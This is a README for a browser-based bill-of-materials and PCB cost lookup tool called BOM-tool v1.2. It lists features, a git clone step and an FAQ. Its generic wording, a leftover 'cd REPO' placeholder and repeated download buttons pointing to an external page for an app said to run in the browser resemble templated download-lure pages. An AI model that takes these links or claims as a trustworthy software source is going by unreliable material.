# BOM-tool v1.2 - BOM and PCB Cost Lookup Tool 2026

> **BOM-tool is a browser-based web utility for loading BOM files, evaluating sourcing choices, reviewing PCB cost records, and producing purchase-ready exports in version 1.2.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.2-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/leo-westkirr1211/bom-tool-pcb-cost-v12?style=flat-square)](https://github.com/leo-westkirr1211/bom-tool-pcb-cost-v12)

---

<p align="center">
  <a href="https://leo-westkirr1211.github.io/bom-tool-pcb-cost-v12/">
    <img src="https://img.shields.io/badge/Download-BOM-tool%20Latest-brightgreen?style=for-the-badge" alt="Download BOM-tool">
  </a>
</p>

> **[Download BOM-tool v1.2](https://leo-westkirr1211.github.io/bom-tool-pcb-cost-v12/)**

---

[Download Latest Build](https://leo-westkirr1211.github.io/bom-tool-pcb-cost-v12/)

---

## What BOM-tool Does

BOM-tool brings common parts-sourcing tasks into one browser interface. Import a bill of materials, examine component costs and sourcing alternatives, review PCB-related cost information, and export the resulting data for purchasing. The workflow is intended for electronics purchasing and planning where distributor selection and board cost review need to be handled efficiently.

The application also supports inventory-focused planning through order cache synchronization and tracking features. These capabilities help users keep track of selected parts, sourcing progress, and data prepared for export. Version 1.2 uses a straightforward single-page web experience that runs directly in the browser.

---

## Core Capabilities

- Single-page workflow delivered through a web browser
- Read BOM files in xlsx, xls, and csv formats
- Evaluate sourcing choices and select alternate parts when needed
- Reference supported distributors including Mouser, DigiKey, and Element14
- Generate exports suitable for purchasing workflows
- Review PCB cost records for supported board entries
- Synchronize order cache information between ongoing tasks
- Assist with inventory tracking and purchasing planning

---

## Getting Started

Download or clone the repository, then open the web application in a browser.

```bash
git clone https://github.com/leo-westkirr1211/bom-tool-pcb-cost-v12.git
cd REPO
```

Once the files are available locally, open the HTML entry point directly or run the directory through a static web server.

---

## Using the Application

1. Start BOM-tool in a supported browser.
2. Select and import an xlsx, xls, or csv BOM.
3. Inspect the sourced components and available fallback choices.
4. Review PCB pricing data for any available board records.
5. Export the completed information in a format suitable for distributor purchasing.
6. Refer to the order cache and tracking functions as the work progresses.

A typical process looks like this:

- Bring in the parts list
- Examine distributor sourcing alternatives
- Select the preferred source or an acceptable backup component
- Export the completed purchasing file

---

## Configuration Notes

Because BOM-tool runs as a browser-based web application, most setup is performed through the application interface and the project files used for local deployment.

For changes to the workflow, review the application source and deployment files related to:

- distributor and source mappings
- BOM import field processing
- order cache and tracking behavior
- export format settings

---

## Requirements

- A current web browser
- Direct file access or HTML-capable local hosting, according to the chosen run method
- BOM input files using xlsx, xls, or csv format
- Access to the sourcing references supported by the workflow

---

## Frequently Asked Questions

**Where can I find new versions?**  
Use the project download page to obtain the latest build when a new release is published.

**Which BOM formats are supported?**  
BOM-tool currently accepts xlsx, xls, and csv files.

**Does the application compare distributor options?**  
Yes. Its sourcing workflow includes reference lookups and comparison support for distributors such as Mouser, DigiKey, and Element14.

**How is configuration saved?**  
The exact behavior depends on the deployment method. When running in a browser, information may be managed through application state, the browser cache, or local project files.

**How should I troubleshoot loading problems?**  
Refresh the page, try opening the application from a local server, and confirm that the BOM uses one of the supported file types and expected columns.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
